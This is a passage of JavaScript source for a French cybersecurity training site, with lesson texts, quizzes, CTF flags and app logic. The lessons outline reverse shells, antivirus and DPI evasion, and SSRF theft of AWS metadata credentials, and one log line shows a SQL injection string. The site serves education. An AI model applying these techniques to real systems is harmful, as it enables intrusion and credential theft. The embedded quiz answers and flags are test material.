                        { q: "3. Comment lire le texte d'une page web récupérée en Python ?", options: ["response.text", "response.html", "response.read"], ans: "0" },
                        { q: "4. Quel opérateur gère les boucles en Python ?", options: ["for / while", "loop / repeat", "iterate"], ans: "0" },
                        { q: "5. Comment ouvrir un fichier en écriture en Python ?", options: ["open('file.txt', 'w')", "open('file.txt', 'r')", "file.create()"], ans: "0" },
                        { q: "6. Qu'est-ce qu'une exception en programmation ?", options: ["Une erreur gérée par le code pour éviter le crash (try/except)", "Une exception fiscale", "Un fichier corrompu"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel module Python permet d'interagir avec le web ?", options: ["requests", "math", "random"], ans: "0" }]
        },
        {
            id: 302, title: "Niveau 2 : Scanners de Ports & Bruteforce Multithread",
            themes: [
                { 
                    id: "c_lvl2", title: "Masterclass : Sockets et Concurrence", desc: "Guide complet (1-2 pages de lecture) : Création de scanners TCP et scripts de bruteforce rapides.", 
                    content: `
                        <h2>1. Sockets réseau bas niveau</h2>
                        <p>La bibliothèque <code>socket</code> permet d'établir des connexions TCP brutes pour tester l'ouverture des ports sur une machine cible.</p>
                        <h2>2. Multithreading</h2>
                        <p>Pour accélérer un script d'attaque ou de scan, on utilise le module <code>threading</code> afin d'exécuter plusieurs requêtes en parallèle.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Quelle bibliothèque Python permet de créer des connexions TCP brutes ?", options: ["socket", "requests", "json"], ans: "0" },
                        { q: "2. Quel est l'intérêt du Multithreading dans un script de scan ?", options: ["Accélérer considérablement l'exécution en lançant des tâches en parallèle", "Ralentir l'ordinateur", "Chiffrer le code source"], ans: "0" },
                        { q: "3. Qu'est-ce qu'une Wordlist dans un contexte de bruteforce ?", options: ["Un fichier texte contenant une liste de mots de passe potentiels à tester", "Un dictionnaire de synonymes français", "Un fichier de configuration réseau"], ans: "0" },
                        { q: "4. Comment gère-t-on les connexions refusées dans un socket TCP en Python ?", options: ["Via un bloc try/except pour capturer l'exception de connexion", "En redémarrant le PC", "En modifiant le BIOS"], ans: "0" },
                        { q: "5. Quel protocole réseau utilise des ports TCP et UDP ?", options: ["TCP/IP", "Bluetooth", "USB"], ans: "0" },
                        { q: "6. Qu'est-ce qu'un timeout dans une requête réseau ?", options: ["Un délai maximal d'attente avant d'abandonner la connexion", "Une pause déjeuner du serveur", "Une erreur de syntaxe"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quelle bibliothèque gère les connexions TCP bas niveau en Python ?", options: ["socket", "urllib", "time"], ans: "0" }]
        },
        {
            id: 303, title: "Niveau 3 : Développement de Reverse Shells & Payloads",
            themes: [
                { 
                    id: "c_lvl3", title: "Masterclass : Reverse Shells et Subprocess", desc: "Guide complet (1-2 pages de lecture) : Manipulation de processus et connexion inversée.", 
                    content: `
                        <h2>1. Logique du Reverse Shell</h2>
                        <p>Plutôt que d'attendre une connexion entrante, le script malveillant exécuté sur la victime initie une connexion sortante vers l'écouteur de l'attaquant.</p>
                        <h2>2. Le module subprocess</h2>
                        <p>Permet d'exécuter des commandes système directement depuis le script Python.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Qu'est-ce qu'un Reverse Shell ?", options: ["Une connexion inversée où la victime se connecte à l'attaquant pour contourner les pare-feu", "Une marche arrière en voiture", "Une mise à jour système"], ans: "0" },
                        { q: "2. Quel module Python permet d'exécuter des commandes du système d'exploitation ?", options: ["subprocess", "math", "datetime"], ans: "0" },
                        { q: "3. Pourquoi les reverse shells contournent-ils généralement les pare-feu d'entreprise ?", options: ["Parce que les flux sortants vers Internet sont souvent autorisés pour les employés", "Parce qu'ils sont invisibles", "Parce qu'ils utilisent le Bluetooth"], ans: "0" },
                        { q: "4. Quel est le rôle d'un écouteur (Listener) comme Netcat chez l'attaquant ?", options: ["Attendre et réceptionner la connexion entrante de la victime", "Écouter de la musique", "Enregistrer le son du micro"], ans: "0" },
                        { q: "5. Qu'est-ce qu'une redirection de flux standard (stdin/stdout) ?", options: ["Envoyer les entrées/sorties d'un terminal à travers un socket réseau", "Transférer un fichier par e-mail", "Imprimer un document"], ans: "0" },
                        { q: "6. Quel risque présente l'exécution d'un script Python non vérifié sur sa machine ?", options: ["Exécution de code arbitraire et compromission totale du système", "Ralentissement de l'affichage", "Changement de la langue du clavier"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel module Python est utilisé pour lancer des commandes système dans un reverse shell ?", options: ["subprocess", "sys", "csv"], ans: "0" }]
        },
        {
            id: 304, title: "Niveau 4 (Expert) : Obfuscation & Exploits Avancés",
            themes: [
                { 
                    id: "c_lvl4", title: "Masterclass : Contournement EDR et Chiffrement de Payloads", desc: "Guide complet (1-2 pages de lecture) : Obfuscation de code et sockets chiffrés en Python.", 
                    content: `
                        <h2>1. Obfuscation de code</h2>
                        <p>Pour contrer l'analyse statique des antivirus, les scripts sont chiffrés ou encodés et déchiffrés dynamiquement en mémoire.</p>
                        <h2>2. Sockets SSL/TLS</h2>
                        <p>Encapsuler les flux du reverse shell dans du SSL/TLS (via le module <code>ssl</code>) permet de tromper les sondes DPI du réseau.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Quel est l'objectif principal de l'obfuscation de code en programmation offensive ?", options: ["Masquer la signature du code pour contourner l'analyse statique des antivirus", "Rendre le code illisible pour l'auteur", "Compresser la taille du fichier"], ans: "0" },
                        { q: "2. Comment sécuriser un socket réseau en Python pour contrer l'analyse DPI ?", options: ["En l'encapsulant avec le module ssl (TLS)", "En écrivant en minuscules", "En utilisant le protocole HTTP"], ans: "0" },
                        { q: "3. Qu'est-ce qu'un décodeur stub (stubs de décodage) ?", options: ["Un petit bout de code chargé de déchiffrer le payload principal en mémoire à l'exécution", "Un bâton de marche", "Un connecteur USB"], ans: "0" },
                        { q: "4. Qu'est-ce que l'analyse heuristique d'un antivirus ?", options: ["Une méthode de détection cherchant des comportements suspects ou des structures de code malveillantes", "Un test de QI du processeur", "Un scan de la mémoire RAM"], ans: "0" },
                        { q: "5. Quelle fonction mathématique simple est souvent utilisée pour l'obscurcissement basique de chaînes ?", options: ["XOR", "Racine carrée", "Cosinus"], ans: "0" },
                        { q: "6. Qu'est-ce qu'une exécution de code in-memory (Fileless) ?", options: ["Exécuter du code directement dans la RAM sans jamais l'écrire sur le disque dur", "Imprimer du code sur papier", "Sauvegarder sur clé USB"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel module Python gère le chiffrement SSL/TLS des sockets réseau ?", options: ["ssl", "crypto-net", "secure-socket"], ans: "0" }]
        }
    ],
    "dev": [
        {
            id: 401, title: "Niveau 1 : Architecture du Web et DOM",
            themes: [
                { 
                    id: "d_lvl1", title: "Masterclass : Fondations HTML, CSS et DOM", desc: "Guide complet (1-2 pages de lecture) : Structure des pages web et analyse du code source.", 
                    content: `
                        <h2>1. Le modèle DOM</h2>
                        <p>Le HTML structure la page en arborescence d'objets (DOM). Les attaquants inspectent ce code pour dénicher des commentaires oubliés ou des endpoints cachés.</p>
                    `, 
                    simType: "dev_html", 
                    simData: { instruction: "Écrivez une balise h1 contenant le mot 'Hack'." }, 
                    quiz: [
                        { q: "1. Que signifie DOM ?", options: ["Document Object Model", "Data Online Method", "Direct Output Monitor"], ans: "0" },
                        { q: "2. Quelle balise crée un lien hypertexte ?", options: ["<a>", "<link>", "<href>"], ans: "0" },
                        { q: "3. Quel est l'intérêt d'analyser le code source HTML en pentest ?", options: ["Trouver des commentaires ou des secrets oubliés par les développeurs", "Changer le fond d'écran", "Augmenter la RAM"], ans: "0" },
                        { q: "4. Quel langage gère le design visuel ?", options: ["CSS", "HTML", "SQL"], ans: "0" },
                        { q: "5. Où s'exécute le JavaScript traditionnel ?", options: ["Dans le navigateur client", "Sur le disque dur du serveur", "Dans le routeur"], ans: "0" },
                        { q: "6. Qu'est-ce qu'un attribut HTML ?", options: ["Une information complémentaire placée dans la balise (ex: id, class, href)", "Un fichier image", "Une ligne de code CSS"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel langage structure le contenu textuel d'une page web ?", options: ["HTML", "Python", "SQL"], ans: "0" }]
        },
        {
            id: 402, title: "Niveau 2 : Failles OWASP Top 10 (CSRF & XSS Avancé)",
            themes: [
                { 
                    id: "d_lvl2", title: "Masterclass : Sécurité des Formulaires et CSRF", desc: "Guide complet (1-2 pages de lecture) : Protection des sessions et usurpation de requêtes.", 
                    content: `
                        <h2>1. Attaque CSRF</h2>
                        <p>Le Cross-Site Request Forgery force un utilisateur authentifié à exécuter des actions non souhaitées sur une application web tierce.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Qu'est-ce qu'une attaque CSRF ?", options: ["Forcer un utilisateur authentifié à exécuter des actions à son insu sur un site web", "Voler un mot de passe par écoute réseau", "Inonder un serveur de pings"], ans: "0" },
                        { q: "2. Comment se protège-t-on efficacement contre le CSRF ?", options: ["Utilisation de jetons anti-CSRF (Tokens uniques par session/requête)", "Désactiver JavaScript", "Utiliser HTTP simple"], ans: "0" },
                        { q: "3. Qu'est-ce qu'un cookie SameSite ?", options: ["Un attribut de cookie limitant l'envoi du cookie lors de requêtes cross-site", "Un biscuit numérique", "Un cookie publicitaire"], ans: "0" },
                        { q: "4. Quelle est la différence majeure entre XSS et CSRF ?", options: ["Le XSS exécute du code malveillant sur le site de la victime, le CSRF détourne sa session pour faire des actions légitimes à son insu", "Il n'y en a aucune", "Le CSRF n'existe qu'en Python"], ans: "0" },
                        { q: "5. Qu'est-ce qu'un header HTTP ?", options: ["Une métadonnée transmise dans la requête ou la réponse HTTP (ex: User-Agent, Cookie)", "Le titre principal d'une page web", "Le logo du site"], ans: "0" },
                        { q: "6. Qu'est-ce que l'en-tête CORS (Cross-Origin Resource Sharing) ?", options: ["Un mécanisme de sécurité HTTP contrôlant l'accès aux ressources d'un domaine depuis une origine différente", "Un protocole de messagerie", "Un outil de compression"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quel mécanisme protège les formulaires contre le CSRF ?", options: ["Les tokens anti-CSRF", "Le HTTPS", "Le CSS"], ans: "0" }]
        },
        {
            id: 403, title: "Niveau 3 : Sécurité des API REST & Authentification JWT",
            themes: [
                { 
                    id: "d_lvl3", title: "Masterclass : Analyse et Attaques sur les JWT", desc: "Guide complet (1-2 pages de lecture) : Header, Payload, Signature et failles algorithmiques.", 
                    content: `
                        <h2>1. Structure des JWT</h2>
                        <p>Un JSON Web Token est composé de trois parties séparées par des points : Header, Payload et Signature.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. De combien de parties distinctes est constitué un jeton JWT standard ?", options: ["3 parties (Header, Payload, Signature)", "2 parties", "5 parties"], ans: "0" },
                        { q: "2. Quelle faille classique concerne les JWT ?", options: ["La modification de l'algorithme de signature à 'none' pour contourner la vérification", "L'injection de code SQL dans le header", "Le format d'image corrompu"], ans: "0" },
                        { q: "3. Où sont encodées les données d'un JWT ?", options: ["En Base64Url", "En binaire pur", "En texte clair non encodé"], ans: "0" },
                        { q: "4. Quel est le rôle de la signature dans un JWT ?", options: ["Garantir l'intégrité du jeton et prouver qu'il a été émis par un serveur légitime", "Chiffrer le mot de passe utilisateur", "Accélérer la connexion Wi-Fi"], ans: "0" },
                        { q: "5. Qu'est-ce qu'une API REST ?", options: ["Une interface de programmation applicative basée sur les principes HTTP (GET, POST, PUT, DELETE)", "Un protocole de messagerie instantanée", "Un antivirus"], ans: "0" },
                        { q: "6. Comment attaque-t-on une signature JWT HMAC-SHA256 faible ?", options: ["Par force brute hors-ligne de la clé secrète avec Hashcat", "En modifiant la date du PC", "Par injection SQL"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quelles sont les trois parties d'un JWT ?", options: ["Header, Payload, Signature", "Login, Pass, Token", "Start, Body, End"], ans: "0" }]
        },
        {
            id: 404, title: "Niveau 4 (Expert) : Sécurité Cloud & Attaques SSRF Avancées",
            themes: [
                { 
                    id: "d_lvl4", title: "Masterclass : Server-Side Request Forgery & Cloud Metadata", desc: "Guide complet (1-2 pages de lecture) : Exploitation des services cloud et métadonnées AWS/GCP.", 
                    content: `
                        <h2>1. Server-Side Request Forgery (SSRF)</h2>
                        <p>Une faille SSRF permet de forcer le serveur vulnérable à envoyer des requêtes HTTP forgées vers des services internes inaccessibles depuis l'extérieur.</p>
                        <h2>2. Exploitation des métadonnées Cloud</h2>
                        <p>Sur AWS (<code>http://169.254.169.254/latest/meta-data/</code>), un SSRF permet de récupérer les clés d'accès IAM et de compromettre l'infrastructure Cloud.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Qu'est-ce qu'une faille SSRF (Server-Side Request Forgery) ?", options: ["Forcer le serveur victime à émettre des requêtes HTTP vers des ressources internes ou externes arbitraires", "Une injection SQL sur le client", "Un bug d'affichage CSS"], ans: "0" },
                        { q: "2. Quelle est la cible privilégiée d'une attaque SSRF sur une infrastructure AWS ?", options: ["L'URL du service de métadonnées local (169.254.169.254)", "Le routeur de la maison", "La base de données MySQL publique"], ans: "0" },
                        { q: "3. Quel est l'impact d'une compromission des clés IAM via métadonnées Cloud ?", options: ["Contrôle total des ressources Cloud (S3, instances EC2, bases de données)", "Ralentissement du site web", "Fermeture du navigateur"], ans: "0" },
                        { q: "4. Comment se prémunir contre le SSRF ?", options: ["Valider et filtrer strictement les URLs entrantes, interdire l'accès aux IPs locales (localhost/RFC1918)", "Utiliser uniquement HTTP", "Augmenter la mémoire RAM"], ans: "0" },
                        { q: "5. Qu'est-ce qu'une adresse IP de loopback (localhost) ?", options: ["127.0.0.1", "192.168.1.1", "10.0.0.255"], ans: "0" },
                        { q: "6. Qu'est-ce que l'IP 169.254.169.254 en environnement Cloud ?", options: ["Une adresse IP link-local réservée au service de métadonnées des instances", "L'adresse du serveur racine mondial", "Une IP interdite"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quelle IP cible-t-on lors d'une attaque SSRF sur AWS pour voler les rôles IAM ?", options: ["169.254.169.254", "127.0.0.1", "8.8.8.8"], ans: "0" }]
        }
    ]
};

const ctfDB = [
    { id: "ctf1", title: "L'Inspecteur HTML", difficulty: "Débutant", category: "Web", points: 100, reqTrack: "dev", reqLevel: 401, desc: "Fouillez le code source du navigateur pour extraire le flag caché.", expectedFlag: "FLAG{html_source_ez}", simType: "html" },
    { id: "ctf2", title: "Bypass IDOR Admin", difficulty: "Intermédiaire", category: "Red Team", points: 250, reqTrack: "red", reqLevel: 101, desc: "Exploitez la faille IDOR pour récupérer le jeton administrateur.", expectedFlag: "FLAG{idor_admin_leak}", simType: "idor_ctf" },
    { id: "ctf3", title: "Log Hunter Pro", difficulty: "Intermédiaire", category: "Blue Team", points: 300, reqTrack: "blue", reqLevel: 201, desc: "Analysez les logs du serveur pour retrouver l'IP de l'intrus.", expectedFlag: "FLAG{blue_log_master}", simType: "ctf_logs" },
    { id: "ctf4", title: "SQLi Mastermind", difficulty: "Avancé", category: "Red Team", points: 400, reqTrack: "red", reqLevel: 102, desc: "Exécutez une injection SQL UNION pour extraire le mot de passe secret.", expectedFlag: "FLAG{sqli_union_master}", simType: "idor_ctf" },
    { id: "ctf5", title: "Firewall Analyzer", difficulty: "Avancé", category: "Blue Team", points: 400, reqTrack: "blue", reqLevel: 202, desc: "Identifiez la règle iptables défaillante dans ce rapport de configuration.", expectedFlag: "FLAG{firewall_hardening_ok}", simType: "html" },
    { id: "ctf6", title: "Python Bruteforcer", difficulty: "Avancé", category: "Code (Python)", points: 450, reqTrack: "code", reqLevel: 302, desc: "Réparez le script de socket multithread pour casser le port cible.", expectedFlag: "FLAG{python_sockets_pwn}", simType: "html" },
    { id: "ctf7", title: "JWT Forgery", difficulty: "Expert", category: "Web", points: 600, reqTrack: "dev", reqLevel: 403, desc: "Modifiez le payload d'un jeton JWT pour vous élever au rang admin.", expectedFlag: "FLAG{jwt_algorithm_none}", simType: "html" },
    { id: "ctf8", title: "Cloud Metadata Exfil", difficulty: "Expert", category: "Red Team", points: 700, reqTrack: "red", reqLevel: 104, desc: "Simulez une requête SSRF vers l'IP link-local AWS pour exfiltrer les clés IAM.", expectedFlag: "FLAG{aws_metadata_stolen}", simType: "html" }
];

let accounts = {};
let activeUser = null;
let currentTrack = null;
let authMode = 'login';
let state = { completedCourses: [], completedExams: [], completedCTF: [] };

async function initApp() {
    try {
        const storedDB = localStorage.getItem('cyberacademy_pro_v5');
        if (storedDB) accounts = JSON.parse(storedDB);
        const session = localStorage.getItem('cyberacademy_session_v5');
        if (session && accounts[session]) loginUser(session);
    } catch (e) { accounts = {}; }
}

async function hashPassword(password) {
    const data = new TextEncoder().encode(password);
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
    return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
}

function escapeHTML(str) {
    return str.replace(/[&<>'"]/g, tag => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' }[tag]));
}

function switchView(targetViewId) {
    document.querySelectorAll('.view-section').forEach(el => { 
        el.classList.remove('active-view'); 
        el.style.display = 'none'; 
    });
    const target = document.getElementById(targetViewId);
    if (target) { 
        if(targetViewId === 'auth-view') target.style.display = 'flex';
        else target.style.display = 'block';
        setTimeout(() => target.classList.add('active-view'), 10); 
    }
    window.scrollTo(0, 0);
    if(targetViewId === 'dashboard-view') updateDashboardStats();
}

function setAuthMode(mode) {
    authMode = mode;
    document.getElementById('tab-login').classList.toggle('active', mode === 'login');
    document.getElementById('tab-register').classList.toggle('active', mode === 'register');
    const btn = document.getElementById('auth-btn-action');
    btn.innerText = mode === 'login' ? "INITIALISER LA SESSION" : "CRÉER LE COMPTE";
    document.getElementById('auth-msg').style.display = 'none';
}

async function processAuth() {
    const user = document.getElementById('auth-user').value.trim();
    const pass = document.getElementById('auth-pass').value.trim();
    const msgBox = document.getElementById('auth-msg');
    
    if (!user || !pass) { msgBox.style.display='block'; msgBox.style.color='var(--danger)'; msgBox.innerText="Champs requis manquants."; return; }
    const secureHash = await hashPassword(pass); 

    if (authMode === 'register') {
        if (accounts[user]) { msgBox.style.display='block'; msgBox.style.color='var(--danger)'; msgBox.innerText="Identifiant déjà utilisé."; } 
        else {
            accounts[user] = { passHash: secureHash, completedCourses: [], completedExams: [], completedCTF: [] };
            localStorage.setItem('cyberacademy_pro_v5', JSON.stringify(accounts));
            msgBox.style.display='block'; msgBox.style.color='var(--accent)'; msgBox.innerText="Compte créé avec succès. Connexion...";
            setTimeout(() => loginUser(user), 1000);
        }
    } else {
        if (!accounts[user] || accounts[user].passHash !== secureHash) { msgBox.style.display='block'; msgBox.style.color='var(--danger)'; msgBox.innerText="Identifiants incorrects."; } 
        else { loginUser(user); }
    }
}

function loginUser(username) {
    activeUser = username;
    localStorage.setItem('cyberacademy_session_v5', username);
    state = {
        completedCourses: accounts[username].completedCourses || [],
        completedExams: accounts[username].completedExams || [],
        completedCTF: accounts[username].completedCTF || []
    };
    
    document.getElementById('main-header').style.display = 'flex';
    document.getElementById('header-user').innerText = "@" + username;
    
    updateProfileUI();
    renderCTF();
    switchView('dashboard-view');
}

function logout() {
    activeUser = null;
    localStorage.removeItem('cyberacademy_session_v5');
    document.getElementById('main-header').style.display = 'none';
    setAuthMode('login');
    switchView('auth-view');
}

function saveProgress() {
    if (activeUser && accounts[activeUser]) {
        accounts[activeUser] = { ...accounts[activeUser], ...state };
        localStorage.setItem('cyberacademy_pro_v5', JSON.stringify(accounts));
    }
    updateProfileUI();
}

function updateProfileUI() {
    let pts = (state.completedCourses.length * 50) + (state.completedExams.length * 200) + (state.completedCTF.length * 150);
    document.getElementById('header-points').innerText = pts.toString().padStart(4, '0') + " PTS";
    let rank = "Recrue"; if(pts >= 500) rank = "Initié"; if(pts >= 1500) rank = "Opérateur"; if(pts >= 3000) rank = "Expert Elite";
    document.getElementById('header-rank').innerText = rank;
}

function updateDashboardStats() {
    let pts = (state.completedCourses.length * 50) + (state.completedExams.length * 200) + (state.completedCTF.length * 150);
    let rank = "Recrue"; if(pts >= 500) rank = "Initié"; if(pts >= 1500) rank = "Opérateur"; if(pts >= 3000) rank = "Expert Elite";
    
    document.getElementById('dash-rank').innerText = rank;
    document.getElementById('dash-pts').innerText = pts.toString().padStart(4, '0') + " PTS";
    document.getElementById('dash-ctf-count').innerText = `${state.completedCTF.length} / ${ctfDB.length}`;
}

function openForensicsLesson(type) {
    const box = document.getElementById('forensics-content-box');
    box.style.display = 'block';
    let content = "";
    if(type === 'pcap') { content = `<h2>Analyse de Trames Réseau (PCAP)</h2><p>Une capture PCAP enregistre chaque paquet traversant une interface réseau. Avec des filtres Wireshark comme <code>http.request.method == "POST"</code>, on isole le trafic sensible.</p>`; } 
    else if(type === 'memory') { content = `<h2>Analyse de Dump RAM avec Volatility</h2><p>Volatility est le framework standard pour examiner la mémoire vive.</p>`; }
    box.innerHTML = `<div class="content-box">${content}<button class="btn-back" onclick="document.getElementById('forensics-content-box').style.display='none'">Fermer</button></div>`;
    box.scrollIntoView({ behavior: 'smooth' });
}

function openTrack(trackKey) {
    currentTrack = trackKey;
    document.getElementById('tracks-selection').style.display = 'none';
    document.getElementById('track-content').style.display = 'block';
    
    const titles = { "dev": "🌐 Fondations Web & API", "red": "🔴 Red Team & Active Directory", "blue": "🔵 Blue Team & Incident Response", "code": "💻 Scripting Python Offensif" };
    document.getElementById('current-track-title').innerText = titles[trackKey];
    
    const container = document.getElementById('levels-container');
    container.innerHTML = '';
    
    trackDB[trackKey].forEach((level, index) => {
        const unlocked = index === 0 || state.completedExams.includes(trackDB[trackKey][index - 1].id);
        const statusBadge = unlocked ? `<span class="status-badge unlocked">🔓 DÉBLOQUÉ</span>` : `<span class="status-badge locked">🔒 VERROUILLÉ</span>`;

        let themesHTML = ''; 
        let allDone = true;
        level.themes.forEach(theme => {
            const isDone = state.completedCourses.includes(theme.id);
            if(!isDone) allDone = false;
            const cardClass = "theme-card " + (isDone ? 'completed' : '') + (!unlocked ? ' disabled' : '');
            themesHTML += `<div class="${cardClass}" onclick="openCourse('${trackKey}', '${theme.id}', ${unlocked})"><div class="theme-title">${theme.title}</div><div class="theme-desc">${theme.desc}</div></div>`;
        });

        const examDone = state.completedExams.includes(level.id);
        let examHTML = '';
        if (unlocked && allDone && !examDone) {
            examHTML = `<button class="auth-btn" style="margin-top:15px; background:var(--warning); color:#000;" onclick="passExam(${level.id})">Valider le niveau et débloquer les CTF</button>`;
        } else if (examDone) {
            examHTML = `<div style="margin-top:15px; color:var(--accent); font-family:monospace; font-weight:bold;">[ NIVEAU ${index+1} VALIDÉ & CERTIFIÉ ]</div>`;
        } else if (unlocked && !allDone) {
            examHTML = `<div style="margin-top:15px; color:var(--text-muted); font-size:0.85rem;">* Lisez la masterclass ci-dessus et validez le QCM de 6 questions.</div>`;
        }

        container.innerHTML += `<div class="level-section" style="padding:20px; margin-bottom:20px; background:rgba(0,0,0,0.4); border-radius:8px;"><div class="level-header" style="display:flex; justify-content:space-between; margin-bottom:15px;"><h3>${level.title}</h3>${statusBadge}</div><div class="theme-grid">${themesHTML}</div>${examHTML}</div>`;
    });
}

function passExam(levelId) {
    if(!state.completedExams.includes(levelId)) {
        state.completedExams.push(levelId);
        saveProgress();
        alert("Niveau validé avec succès ! Les CTF associés sont désormais débloqués.");
        openTrack(currentTrack);
        renderCTF();
    }
}

function backToTracks() {
    currentTrack = null;
    document.getElementById('track-content').style.display = 'none';
    document.getElementById('tracks-selection').style.display = 'grid';
}

function openCourse(trackKey, themeId, isUnlocked) {
    if (!isUnlocked) return;
    let currentCourse = null;
    trackDB[trackKey].forEach(l => l.themes.forEach(t => { if (t.id === themeId) currentCourse = t; }));
    
    document.getElementById('theme-view').dataset.courseId = themeId;
    document.getElementById('lesson-title').innerText = currentCourse.title;
    document.getElementById('lesson-desc').innerText = currentCourse.desc;
    document.getElementById('lesson-content').innerHTML = currentCourse.content;
    
    const simC = document.getElementById('simulator-container');
    if (currentCourse.simType === "terminal") { simC.innerHTML = `<div class="sim-box sim-red"><div class="sim-header">💻 [ TERMINAL ] : ${currentCourse.simData.instruction}</div><input type="text" id="term-input" class="term-input" placeholder="root@academy:~#" autocomplete="off" onkeypress="handleTerm(event, '${btoa(currentCourse.simData.expected)}', '${btoa(currentCourse.simData.successOutput)}')"><div id="term-output" class="term-output">En attente...</div></div>`; }
    else if (currentCourse.simType === "logs") { simC.innerHTML = `<div class="sim-box sim-blue"><div class="sim-header">🔵 [ LOG VIEWER ]</div><div class="log-viewer">192.168.1.50 - GET /login?user=' OR 1=1</div><input type="text" id="log-input" class="web-input" placeholder="IP..."><button class="auth-btn" style="background:#3b82f6;" onclick="checkLogs()">Analyser</button><div id="log-output" class="term-output"></div></div>`; }
    else { simC.innerHTML = ''; }
    
    let quizHTML = '';
    currentCourse.quiz.forEach((q, qIndex) => {
        let optionsHTML = '';
        q.options.forEach((opt, optIndex) => { optionsHTML += `<label><input type="radio" name="cq_${qIndex}" value="${btoa(optIndex.toString())}"> ${opt}</label>`; });
        quizHTML += `<div style="margin-bottom:20px;"><p style="font-weight:bold; margin-bottom:10px; color:#fff;">${q.q}</p><div class="options">${optionsHTML}</div></div>`;
    });
    document.getElementById('quiz-content').innerHTML = quizHTML;
    document.getElementById('quiz-result').style.display = 'none';
    switchView('theme-view');
}

function handleTerm(e, expectedHash, outputHash) { if (e.key === 'Enter') { const val = escapeHTML(e.target.value.trim().toLowerCase()); if (btoa(val) === expectedHash) { document.getElementById('term-output').innerHTML = "<span style='color:var(--accent);'>" + atob(outputHash) + "</span>"; } else { document.getElementById('term-output').innerHTML = `<span style='color:var(--danger);'>bash: ${val}: command not found</span>`; } } }
function checkLogs() { const val = document.getElementById('log-input').value.trim(); if (val === "192.168.1.50") { document.getElementById('log-output').innerHTML = "<span style='color:var(--accent);'>[IP CONFIRMÉE] Attaque identifiée.</span>"; } else { document.getElementById('log-output').innerHTML = "Rien."; } }

function submitThemeQCM() {
    const courseId = document.getElementById('theme-view').dataset.courseId;
    let currentCourse = null;
    trackDB[currentTrack].forEach(l => l.themes.forEach(t => { if (t.id === courseId) currentCourse = t; }));

    let allCorrect = true;
    currentCourse.quiz.forEach((q, index) => {
        const inputs = document.getElementsByName('cq_' + index);
        let selectedVal = null;
        for(let i=0; i<inputs.length; i++) { if(inputs[i].checked) selectedVal = inputs[i].value; }
        if (selectedVal !== btoa(q.ans)) allCorrect = false;
    });
    
    const resBox = document.getElementById('quiz-result');
    resBox.style.display = 'block';
    
    if (allCorrect) {
        resBox.className = 'res-success'; resBox.style.background = 'rgba(16, 185, 129, 0.2)'; resBox.style.color = 'var(--accent)'; resBox.style.border = '1px solid var(--accent)';
        resBox.innerText = "[+] QCM Validé à 100% ! Retour au module...";
        if (!state.completedCourses.includes(courseId)) { state.completedCourses.push(courseId); saveProgress(); openTrack(currentTrack); }
        setTimeout(() => switchView('tracks-view'), 1200);
    } else {
        resBox.className = 'res-error'; resBox.style.background = 'rgba(239, 68, 68, 0.2)'; resBox.style.color = 'var(--danger)'; resBox.style.border = '1px solid var(--danger)';
        resBox.innerText = "[-] Échec de l'évaluation technique. Relisez attentivement la masterclass.";
    }
}

function renderCTF() {
    const container = document.getElementById('ctf-container');
    container.innerHTML = '';
    
    ctfDB.forEach(ctf => {
        const isDone = state.completedCTF.includes(ctf.id);
        let isUnlocked = ctf.reqTrack === null || state.completedExams.includes(ctf.reqLevel);
        let catColor = "var(--danger)";
        if(ctf.category === "Blue Team") catColor = "#3b82f6";
        
        if (isUnlocked) {
            const cardClass = "theme-card " + (isDone ? 'completed' : '');
            container.innerHTML += `<div class="${cardClass}" style="border-left: 4px solid ${catColor}; position:relative;" onclick="openCTF('${ctf.id}')"><div style="color:${catColor}; font-size:0.8rem; font-weight:bold; margin-bottom:5px;">[${ctf.category}] ${ctf.difficulty} | ${ctf.points} PTS</div><div class="theme-title">${ctf.title}</div><div class="theme-desc">${ctf.desc}</div></div>`;
        } else {
            container.innerHTML += `<div class="theme-card ctf-locked" style="border-left: 4px solid #333; position:relative;"><div class="lock-icon">🔒</div><div style="color:var(--text-muted); font-size:0.8rem; font-weight:bold; margin-bottom:5px;">[${ctf.category}] ${ctf.difficulty}</div><div class="theme-title">${ctf.title}</div><div class="theme-desc">Requis : Valider l'examen du niveau ${ctf.reqLevel}</div></div>`;
        }
    });
}

function openCTF(ctfId) {
    let currentCTF = null; ctfDB.forEach(c => { if(c.id === ctfId) currentCTF = c; });
    document.getElementById('challenge-view').dataset.ctfId = ctfId;
    document.getElementById('challenge-desc').innerHTML = `<h2>${currentCTF.title}</h2><p>${currentCTF.desc}</p>`;
    
    const simC = document.getElementById('challenge-sim-container');
    if(currentCTF.simType === "html") { simC.innerHTML = `<div class="sim-box"><div class="sim-header">💻 Faux Navigateur Web</div><div style="background:#fff; color:#000; padding:20px; text-align:center;"><h1>Admin</h1></div><button onclick="document.getElementById('source-code').style.display='block'" class="btn-back" style="margin-top:10px;">Code source</button><div id="source-code" style="display:none; margin-top:15px; color:#4ade80; font-family:monospace;">&lt;html&gt;<br>&nbsp;&nbsp;&lt;!-- ${currentCTF.expectedFlag} --&gt;<br>&lt;/html&gt;</div></div>`; }
    else if(currentCTF.simType === "idor_ctf") { simC.innerHTML = `<div class="sim-box sim-red"><div class="sim-header">Cible IDOR / SQLi</div><input type="text" id="ctf-idor-id" class="web-input" value="5" placeholder="Paramètre..."><button class="auth-btn" style="background:var(--danger);" onclick="checkCTFIDOR('${currentCTF.expectedFlag}')">Inspecter</button><div id="ctf-idor-out" class="term-output"></div></div>`; }
